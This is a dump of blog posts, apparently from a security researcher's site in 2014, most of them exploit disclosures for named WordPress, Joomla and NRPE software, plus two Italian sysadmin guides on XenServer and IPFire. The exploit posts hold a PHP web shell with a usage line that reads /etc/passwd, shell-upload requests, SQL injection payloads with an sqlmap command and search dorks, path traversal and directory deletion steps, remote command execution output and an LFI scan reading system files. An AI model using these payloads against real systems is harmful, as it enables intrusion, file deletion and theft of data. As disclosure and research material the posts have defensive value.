application/octet-stream\r\u0026lt;?php\rif(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;;\r$cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]);\rsystem($cmd);\recho \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\rdie;\r}\r?\u0026gt;\rUsage: http://target.com/shell.php?cmd=cat+/etc/passwd\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[image_oldfile]\u0026#34;\r2136.png\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[image_url]\u0026#34;\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[uselink]\u0026#34;\rN\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[link]\u0026#34;\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;Slide[linktarget]\u0026#34;\rself\r-----------------------------31064175401770\rContent-Disposition: form-data; name=\u0026#34;submit\u0026#34;\rSave Slide\r-----------------------------31064175401770--\rBackdoor location:\rhttp://127.0.0.1/wp-content/uploads/slideshow-gallery/shell.php?cmd=pwd\rPoC Video:\rhttps://www.youtube.com/watch?v=9iuMsUFl9dM\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-09: Discovered vulnerability (1.4.5 version)\r2014-08-09: Vendor Notification (Twitter)\r2014-08-14: Plugin version 1.4.6 released without fix\r2014-08-14: Vendor Notification (Support web page)\r2014-08-15: Vendor Response/Feedback 2014-08-29: Vendor Fix/Patch (1.4.7)\r2014-09-01: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/09/01/wordpress-slideshow-gallery-1-4-6-shell-upload-vulnerability/","summary":"######################\r# Exploit Title : WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://tribulant.com\r# Software Link : http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip\r# Date : 2014-08-09\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Description : Any user could upload php files (administrator by default).\r######################\r# Location\rhttp://127.0.0.1/wp-content/plugins/slideshow-gallery/views/admin/slides/save.php\r######################\r# PoC Exploit:\rPOST\rHost=127.0.0.1\rUser-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.","title":"WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability"},{"content":"     NRPE 2.15 Remote Command Execution python Exploit – CVE-2014-2913\nDownload Exploit: HERE\nCustom Command Mode: claudio@backbox3:~/Desktop$ ./nrpe_215_rce_exploit.py -H 10.0.0.70 --cmd=\u0026#34;id\u0026#34; -c check_users\r$$\\ $$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$$$\\ $$$$$$\\ $$\\ $$$$$$$\\\r$$$\\ $$ |$$ __$$\\ $$ __$$\\ $$ _____| $$ __$$\\ $$$$ | $$ ____|\r$$$$\\ $$ |$$ | $$ |$$ | $$ |$$ | \\__/ $$ | \\_$$ | $$ |\r$$ $$\\$$ |$$$$$$$ |$$$$$$$ |$$$$$\\ $$$$$$ | $$ | $$$$$$$\\\r$$ \\$$$$ |$$ __$$\u0026lt; $$ ____/ $$ __| $$ ____/ $$ | \\_____$$\\\r$$ |\\$$$ |$$ | $$ |$$ | $$ | $$ | $$ | $$\\ $$ |\r$$ | \\$$ |$$ | $$ |$$ | $$$$$$$$\\ $$$$$$$$\\ $$\\ $$$$$$\\$$$$$$ |\r\\__| \\__|\\__| \\__|\\__| \\________| \\________|\\__|\\______|\\______/\r$$$$$$$\\ $$$$$$\\ $$$$$$$$\\\r$$ __$$\\ $$ __$$\\ $$ _____|\r$$ | $$ |$$ / \\__|$$ |\r$$$$$$$ |$$ | $$$$$\\\r$$ __$$\u0026lt; $$ | $$ __|\r$$ | $$ |$$ | $$\\ $$ |\r$$ | $$ |\\$$$$$$ |$$$$$$$$\\\r\\__| \\__| \\______/ \\________|\rNRPE \u0026lt;= 2.15 R3m0t3 C0mm4nd Ex3cut10n\r=============================================\r- Release date: 17.04.2014\r- Discovered by: Dawid Golunski\r- Severity: High\r- CVE: 2014-2913\r=============================================\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Target: 10.0.0.70\r[+] Command: id [+] Custom command Mode....\r[+]\r[+] Connecting......\r[+] Checking for NRPE command check_users: VULNERABLE!\r[+]\r[+] Max Output CHAR 1024 (According to NRPE \u0026lt;= 2.15 specifications)\r[+]\r[+] Please ignore NRPE plugin command messages (Usage or Errors)\r[+]\rUsage:\rcheck_users -w \u0026lt;users\u0026gt; -c \u0026lt;users\u0026gt;\ruid=496(nrpe) gid=497(nagios) gruppi=496(nrpe),497(nagios) Brute Force Mode: claudio@backbox3:~/Desktop$ ./nrpe_215_rce_exploit.py -H 10.0.0.70 --cmd=\u0026#34;id\u0026#34; -b\r$$\\ $$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$$$\\ $$$$$$\\ $$\\ $$$$$$$\\\r$$$\\ $$ |$$ __$$\\ $$ __$$\\ $$ _____| $$ __$$\\ $$$$ | $$ ____|\r$$$$\\ $$ |$$ | $$ |$$ | $$ |$$ | \\__/ $$ | \\_$$ | $$ |\r$$ $$\\$$ |$$$$$$$ |$$$$$$$ |$$$$$\\ $$$$$$ | $$ | $$$$$$$\\\r$$ \\$$$$ |$$ __$$\u0026lt; $$ ____/ $$ __| $$ ____/ $$ | \\_____$$\\\r$$ |\\$$$ |$$ | $$ |$$ | $$ | $$ | $$ | $$\\ $$ |\r$$ | \\$$ |$$ | $$ |$$ | $$$$$$$$\\ $$$$$$$$\\ $$\\ $$$$$$\\$$$$$$ |\r\\__| \\__|\\__| \\__|\\__| \\________| \\________|\\__|\\______|\\______/\r$$$$$$$\\ $$$$$$\\ $$$$$$$$\\\r$$ __$$\\ $$ __$$\\ $$ _____|\r$$ | $$ |$$ / \\__|$$ |\r$$$$$$$ |$$ | $$$$$\\\r$$ __$$\u0026lt; $$ | $$ __|\r$$ | $$ |$$ | $$\\ $$ |\r$$ | $$ |\\$$$$$$ |$$$$$$$$\\\r\\__| \\__| \\______/ \\________|\rNRPE \u0026lt;= 2.15 R3m0t3 C0mm4nd Ex3cut10n\r=============================================\r- Release date: 17.04.2014\r- Discovered by: Dawid Golunski\r- Severity: High\r- CVE: 2014-2913\r=============================================\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Target: 10.0.0.70\r[+] Command: id [+] Brute force Mode....\r[+]\r[-] Checking for NRPE command check_all: not found\r[-] Checking for NRPE command check_apt: not found\r[-] Checking for NRPE command check_bdii: not found\r[-] Checking for NRPE command check_bonding: not found\r[-] Checking for NRPE command check_breeze: not found\r[-] Checking for NRPE command check_by_ssh: not found\r[-] Checking for NRPE command check_check-updates: not found\r[-] Checking for NRPE command check_check_sip: not found\r[-] Checking for NRPE command check_cluster: not found\r[-] Checking for NRPE command check_dhcp: not found\r[-] Checking for NRPE command check_dig: not found\r[+] Checking for NRPE command check_disk: VULNERABLE!\r[+]\r[+] Max Output CHAR 1024 (According to NRPE \u0026lt;= 2.15 specifications)\r[+]\r[+] Please ignore NRPE plugin command messages (Usage or Errors)\r[+]\rUnknown argument\rUsage:\rcheck_disk -w limit -c limit [-W limit] [-K limit] {-p path | -x device}\r[-C] [-E] [-e] [-g group ] [-k] [-l] [-M] [-m] [-R path ] [-r path ]\r[-t timeout] [-u unit] [-v] [-X type]\ruid=496(nrpe) gid=497(nagios) gruppi=496(nrpe),497(nagios) ","permalink":"https://www.homelab.it/index.php/2014/08/28/nrpe-2-15-remote-command-execution-exploit/","summary":"NRPE 2.15 Remote Command Execution python Exploit – CVE-2014-2913\nDownload Exploit: HERE\nCustom Command Mode: claudio@backbox3:~/Desktop$ ./nrpe_215_rce_exploit.py -H 10.0.0.70 --cmd=\u0026#34;id\u0026#34; -c check_users\r$$\\ $$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$$$\\ $$$$$$\\ $$\\ $$$$$$$\\\r$$$\\ $$ |$$ __$$\\ $$ __$$\\ $$ _____| $$ __$$\\ $$$$ | $$ ____|\r$$$$\\ $$ |$$ | $$ |$$ | $$ |$$ | \\__/ $$ | \\_$$ | $$ |\r$$ $$\\$$ |$$$$$$$ |$$$$$$$ |$$$$$\\ $$$$$$ | $$ | $$$$$$$\\\r$$ \\$$$$ |$$ __$$\u0026lt; $$ ____/ $$ __| $$ ____/ $$ | \\_____$$\\\r$$ |\\$$$ |$$ | $$ |$$ | $$ | $$ | $$ | $$\\ $$ |\r$$ | \\$$ |$$ | $$ |$$ | $$$$$$$$\\ $$$$$$$$\\ $$\\ $$$$$$\\$$$$$$ |\r\\__| \\__|\\__| \\__|\\__| \\________| \\________|\\__|\\______|\\______/\r$$$$$$$\\ $$$$$$\\ $$$$$$$$\\\r$$ __$$\\ $$ __$$\\ $$ _____|\r$$ | $$ |$$ / \\__|$$ |\r$$$$$$$ |$$ | $$$$$\\\r$$ __$$\u0026lt; $$ | $$ __|\r$$ | $$ |$$ | $$\\ $$ |\r$$ | $$ |\\$$$$$$ |$$$$$$$$\\\r\\__| \\__| \\______/ \\________|\rNRPE \u0026lt;= 2.","title":"NRPE 2.15 Remote Command Execution Exploit"},{"content":"[claudio@localhost ~]$ ./aLFIscanner.py -u 10.0.0.67 -t lfi.php?ID=\r$$\\ $$$$$$$$\\ $$$$$$\\\r$$ | $$ _____|\\_$$ _|\r$$$$$$\\ $$ | $$ | $$ |\r\\____$$\\ $$ | $$$$$\\ $$ |\r$$$$$$$ |$$ | $$ __| $$ |\r$$ __$$ |$$ | $$ | $$ |\r\\$$$$$$$ |$$$$$$$$\\ $$ | $$$$$$\\\r\\_______|\\________|\\__| \\______|\r$$$$$$\\\r$$ __$$\\\r$$ / \\__| $$$$$$$\\ $$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$\\\r\\$$$$$$\\ $$ _____|\\____$$\\ $$ __$$\\ $$ __$$\\ $$ __$$\\ $$ __$$\\\r\\____$$\\ $$ / $$$$$$$ |$$ | $$ |$$ | $$ |$$$$$$$$ |$$ | \\__|\r$$\\ $$ |$$ | $$ __$$ |$$ | $$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$$\\$$$$$$$ |$$ | $$ |$$ | $$ |\\$$$$$$$\\ $$ |\r\\______/ \\_______|\\_______|\\__| \\__|\\__| \\__| \\_______|\\__|\rAn0th3r LFI sC4Nn3r v1.0\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[*] URL: http://10.0.0.67\r[*] TARGET: lfi.php?ID=\r[*] PORT: 80\r[+] http://10.0.0.67:80/lfi.php?ID=../etc/hosts\r[+] http://10.0.0.67:80/lfi.php?ID=../../etc/hosts\r[+] http://10.0.0.67:80/lfi.php?ID=../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../../etc/hosts \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../etc/passwd\r[+] http://10.0.0.67:80/lfi.php?ID=../../etc/passwd\r[+] http://10.0.0.67:80/lfi.php?ID=../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../../etc/passwd \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../etc/group\r[+] http://10.0.0.67:80/lfi.php?ID=../../etc/group\r[+] http://10.0.0.67:80/lfi.php?ID=../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../etc/group \u0026lt;--- FOUND\r[+] http://10.0.0.67:80/lfi.php?ID=../../../../../../../../../../etc/group \u0026lt;--- FOUND Download Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2014/08/26/alfi-scanner-an0th3r-lfi-sc4nn3r-v1-0/","summary":"[claudio@localhost ~]$ ./aLFIscanner.py -u 10.0.0.67 -t lfi.php?ID=\r$$\\ $$$$$$$$\\ $$$$$$\\\r$$ | $$ _____|\\_$$ _|\r$$$$$$\\ $$ | $$ | $$ |\r\\____$$\\ $$ | $$$$$\\ $$ |\r$$$$$$$ |$$ | $$ __| $$ |\r$$ __$$ |$$ | $$ | $$ |\r\\$$$$$$$ |$$$$$$$$\\ $$ | $$$$$$\\\r\\_______|\\________|\\__| \\______|\r$$$$$$\\\r$$ __$$\\\r$$ / \\__| $$$$$$$\\ $$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$$$$$\\\r\\$$$$$$\\ $$ _____|\\____$$\\ $$ __$$\\ $$ __$$\\ $$ __$$\\ $$ __$$\\\r\\____$$\\ $$ / $$$$$$$ |$$ | $$ |$$ | $$ |$$$$$$$$ |$$ | \\__|\r$$\\ $$ |$$ | $$ __$$ |$$ | $$ |$$ | $$ |$$ ____|$$ |\r\\$$$$$$ |\\$$$$$$$\\$$$$$$$ |$$ | $$ |$$ | $$ |\\$$$$$$$\\ $$ |\r\\______/ \\_______|\\_______|\\__| \\__|\\__| \\__| \\_______|\\__|\rAn0th3r LFI sC4Nn3r v1.","title":"aLFI Scanner – An0th3r LFI sC4Nn3r v1.0"},{"content":"######################\r# Exploit Title : Joomla Spider video player 2.8.3 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://extensions.joomla.org/extensions/multimedia/multimedia-players/video-players-a-gallery/22321\r# Dork Google: inurl:/component/spidervideoplayer\rinurl:option=com_spidervideoplayer # Date : 2014-08-26\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/component/spidervideoplayer/?view=settings\u0026amp;format=row\u0026amp;typeselect=0\u0026amp;playlist=1,\u0026amp;theme=1\u0026#39;\r\u0026#34;theme\u0026#34; variable is not sanitized.\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/","summary":"######################\r# Exploit Title : Joomla Spider video player 2.8.3 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://web-dorado.com/\r# Software Link : http://extensions.joomla.org/extensions/multimedia/multimedia-players/video-players-a-gallery/22321\r# Dork Google: inurl:/component/spidervideoplayer\rinurl:option=com_spidervideoplayer # Date : 2014-08-26\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://localhost/component/spidervideoplayer/?view=settings\u0026amp;format=row\u0026amp;typeselect=0\u0026amp;playlist=1,\u0026amp;theme=1\u0026#39;\r\u0026#34;theme\u0026#34; variable is not sanitized.\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.","title":"Joomla Spider video player 2.8.3 SQL Injection"},{"content":"  ######################\r# Exploit Title : WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://gb-plugins.com/\r# Software Link : http://downloads.wordpress.org/plugin/gb-gallery-slideshow.1.5.zip\r# Date : 2014-08-09\r# Tested on : Linux / sqlmap 1.0-dev-5b2ded0\rLinux / Mozilla Firefox\r######################\r# Location : http://localhost/wp-content/plugins/gb-gallery-slideshow/GBgallery.php\r######################\r# Vulnerable code :\rif(isset($_POST[\u0026#39;selected_group\u0026#39;])){\rglobal $gb_post_type, $gb_group_table, $wpdb;\r$my_group_id = $_POST[\u0026#39;selected_group\u0026#39;];\r$my_group = $wpdb-\u0026gt;get_results( \u0026#34;SELECT groups FROM $gb_group_table WHERE id = \u0026#34;.$my_group_id );\r$args = array(\r$_POST[\u0026#39;selected_group\u0026#39;] it\u0026#39;s not sanitized.\r######################\rPoC Exploit:\rPOST /wordpress/wp-admin/admin-ajax.php HTTP/1.1\rAccept-language: en-us,en;q=0.5\rAccept-encoding: gzip,deflate\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rUser-agent: sqlmap/1.0-dev-5b2ded0 (http://sqlmap.org)\rAccept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\rHost: 10.0.0.67\rCookie: wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407707530%7C5ae003a01e51c11e530c14f6149c9d07; wp-settings-time-1=1407537471; wp-settings-time-2=1406916594; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse; voted_2=6; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407707530%7C6988bc86de7b7790fca51ea294e171a1; redux_current_tab=3\rPragma: no-cache\rCache-control: no-cache,no-store\rContent-type: application/x-www-form-urlencoded; charset=utf-8\rContent-length: 120\rConnection: close\raction=gb_ajax_get_group\u0026amp;gb_nonce=5356513fbe\u0026amp;selected_group=[SQL_Injection]\rExploit via sqlmap:\rsqlmap --cookie=\u0026#39;INSERT_WORDPRESS_COOKIE_HERE\u0026#39; -u \u0026#34;http://localhost/wp-admin/admin-ajax.php\u0026#34; \\ --data=\u0026#34;action=gb_ajax_get_group\u0026amp;gb_nonce=5356513fbe\u0026amp;selected_group=2\u0026#34; -p selected_group --dbms=mysql ---\rPlace: POST\rParameter: selected_group\rType: AND/OR time-based blind\rTitle: MySQL \u0026gt; 5.0.11 AND time-based blind\rPayload: action=gb_ajax_get_group\u0026amp;gb_nonce=5356513fbe\u0026amp;selected_group=2 AND SLEEP(5)\rVector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])\r---\rPoC Video:\rhttps://www.youtube.com/watch?v=CoPVqXwE3W4\u0026amp;list\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-09: Discovered vulnerability\r2014-08-09: Vendor Notification (Web Customers Service Form)\r2014-08-10: Vendor Response/Feedback 2014-08-11: 2014-08-11: Public Disclosure\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/08/10/wordpress-gb-gallery-slideshow/","summary":"######################\r# Exploit Title : WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://gb-plugins.com/\r# Software Link : http://downloads.wordpress.org/plugin/gb-gallery-slideshow.1.5.zip\r# Date : 2014-08-09\r# Tested on : Linux / sqlmap 1.0-dev-5b2ded0\rLinux / Mozilla Firefox\r######################\r# Location : http://localhost/wp-content/plugins/gb-gallery-slideshow/GBgallery.php\r######################\r# Vulnerable code :\rif(isset($_POST[\u0026#39;selected_group\u0026#39;])){\rglobal $gb_post_type, $gb_group_table, $wpdb;\r$my_group_id = $_POST[\u0026#39;selected_group\u0026#39;];\r$my_group = $wpdb-\u0026gt;get_results( \u0026#34;SELECT groups FROM $gb_group_table WHERE id = \u0026#34;.","title":"WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection"},{"content":"Volete permettere a XenServer di avviare le macchina virtuali al momento del boot?\nNella versione 6.x di XenServer è stata tolta la possibilità di abilitare tramite GUI l’avvio automatico delle macchine virtuali.\nPer ovviare a questa mancanza basta eseguire due semplici operazioni collegandosi tramite client ssh verso l’hypervisor.\n Configurazione XenServer per l’avvio automatico   Per abilitare XenServer all’avvio automatico delle macchine virtuali si deve prima individuare il numero UUID del pool:\n[root@xenserver ~]# xe pool-list uuid ( RO) : 0f90b70d-3ace-3815-d62e-3f002be9dbce name-label ( RW): name-description ( RW): master ( RO): 2750d25d-8ec4-4c6b-a9f2-12a5f326b38d default-SR ( RW): 8a7efc6b-a1d1-685f-2118-18f2667fed7b [root@xenserver ~]# Reperito il numero UUID del pool, si deve abilitare l’opzione auto_poweron:\n[root@xenserver ~]# xe pool-param-set uuid=0f90b70d-3ace-3815-d62e-3f002be9dbce other-config:auto_poweron=true [root@xenserver ~]# Configurazione macchina virtuale per l’avvio automatico   Per abilitare l’avvio automatico di una macchina virtuale si deve prima individuare il relativo numero UUID:\n[root@xenserver ~]# xe vm-list uuid ( RO) : ef40ea84-7444-4437-9309-08fd3333c572 name-label ( RW): Control domain on host: xenserver-iakuzpms power-state ( RO): running uuid ( RO) : f1e2c259-40c4-acd1-e95a-064a9dac522b name-label ( RW): Development power-state ( RO): running uuid ( RO) : 4034ad60-56e0-8262-109b-7b4888c70512 name-label ( RW): Web power-state ( RO): running uuid ( RO) : 05aabdcc-6ba7-8bd6-bf21-b38683c36d4b name-label ( RW): Mailserver power-state ( RO): running [root@xenserver ~]# Reperito il numero UUID della macchina virtuale, si deve abilitare l’opzione auto_poweron:\n[root@xenserver ~]# xe vm-param-set uuid=f1e2c259-40c4-acd1-e95a-064a9dac522b other-config:auto_poweron=true [root@xenserver ~]# Ripetere l’ultimo comando per ogni macchina virtuale che si desidera abilitare all’avvio automatico.\nRiferimenti http://support.citrix.com/article/CTX133910\n","permalink":"https://www.homelab.it/index.php/2014/08/09/xenserver-avvio-automatico-macchine-virtuali/","summary":"Volete permettere a XenServer di avviare le macchina virtuali al momento del boot?\nNella versione 6.x di XenServer è stata tolta la possibilità di abilitare tramite GUI l’avvio automatico delle macchine virtuali.\nPer ovviare a questa mancanza basta eseguire due semplici operazioni collegandosi tramite client ssh verso l’hypervisor.\n Configurazione XenServer per l’avvio automatico   Per abilitare XenServer all’avvio automatico delle macchine virtuali si deve prima individuare il numero UUID del pool:","title":"XenServer Avvio automatico macchine virtuali"},{"content":"Nei repository IPFire è presente un paccheto dal nome: openvmtools.\nPer installare il pacchetto si possono seguire due procedimenti:\n1) Installazione tramite interfaccia web di managment 2) installazione tramite client ssh: Conclusa l’installazione è possibile verificare la corretta installazione tramite vSphere Client:\n","permalink":"https://www.homelab.it/index.php/2014/08/08/ipfire-e-vmware-tools/","summary":"Nei repository IPFire è presente un paccheto dal nome: openvmtools.\nPer installare il pacchetto si possono seguire due procedimenti:\n1) Installazione tramite interfaccia web di managment 2) installazione tramite client ssh: Conclusa l’installazione è possibile verificare la corretta installazione tramite vSphere Client:","title":"IPFire e VMware tools"},{"content":"\n  ######################\r# Exploit Title : WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://wordpress.org\r# Software Link : http://wordpress.org/wordpress-3.9.2.tar.gz\r# Date : 2014-07-11\r# Tested on : Mozilla Firefox / WordPress 4.0 beta 1\r# Mozilla Firefox / WordPress 4.0 beta 2\r# Mozilla Firefox / WordPress 4.0 beta 3\r# Mozilla Firefox / WordPress 3.9.2\r# Mozilla Firefox / WordPress 3.9.1\r# Mozilla Firefox / WordPress 3.8\r# Mozilla Firefox / WordPress 3.7\r######################\r# Location : http://victim/wp-admin/plugins.php\r######################\r# Description :\rAn admin user could read directories contents or delete writable directories.\r######################\r# PoC Path Traversal + Directory Listing\r1) Choose a plugin\r2) Click on \u0026#34;Deactivate\u0026#34; and \u0026#34;Delete\u0026#34; buttons\r3) Replace plugin location with target directory in the url.\rExample: http://localhost/wp-admin/plugins.php?action=delete-selected\u0026amp;checked[0]=../../../../var/www/.\u0026amp;plugin_status=all\u0026amp;paged=1\u0026amp;s\u0026amp;_wpnonce=1154979245\r4) Click on \u0026#34;Click to view entire list of files which will be delete\u0026#34; link.\r# PoC Path Traversal + File Deletion (WARNING!!! The directories selected will be deleted!!!)\r1) Choose a plugin\r2) Click on \u0026#34;Deactivate\u0026#34; and \u0026#34;Delete\u0026#34; buttons\r3) Replace plugin location with target directory in the url.\rExample: http://localhost/wp-admin/plugins.php?action=delete-selected\u0026amp;checked[0]=../../../../var/www/.\u0026amp;plugin_status=all\u0026amp;paged=1\u0026amp;s\u0026amp;_wpnonce=1154979245\r4) Click on \u0026#34;Yes delete these files\u0026#34;\r# PoC video is available at:\rhttps://www.youtube.com/watch?v=yVtIA82ZJuA\r######################\r# Vulnerability Disclosure Timeline:\r2014-07-10: Discovered vulnerability\r2014-07-10: Vendor Notification (WordPress Security e-mail address)\r2014-07-10: Vendor Response/Feedback (Andrew Nacin - Lead Developer WordPress)\r2014-08-06: 3.9.2 has been released but not fixed 2014-08-06: Public Disclosure #####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/","summary":"######################\r# Exploit Title : WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://wordpress.org\r# Software Link : http://wordpress.org/wordpress-3.9.2.tar.gz\r# Date : 2014-07-11\r# Tested on : Mozilla Firefox / WordPress 4.0 beta 1\r# Mozilla Firefox / WordPress 4.0 beta 2\r# Mozilla Firefox / WordPress 4.0 beta 3\r# Mozilla Firefox / WordPress 3.","title":"WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities"},{"content":"\n######################\r# Exploit Title : WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.codeasily.com/\r# Software Link : http://downloads.wordpress.org/plugin/grand-media.zip\r# Date : 2014-08-01\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Description : Any authenticated user could upload php files (administrator by default).\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-01: Discovered vulnerability\r2014-08-01: Vendor Notification (Twitter)\r2014-08-01: Vendor Response/Feedback 2014-08-02: Vendor Fix/Patch 2014-08-02: Public Disclosure ######################\r# PoC:\rPOST\rHost=127.0.0.1\rUser-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0\rAccept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language=it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding=gzip, deflate\rReferer=http://127.0.0.1/wordpress/wp-admin/admin.php?page=GrandMedia_AddMedia\rContent-Length=916\rContent-Type=multipart/form-data; boundary=---------------------------304431219031197\rCookie=wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407087221%7Ce7319f78d3d8ab969d8896d72dc8c2da; 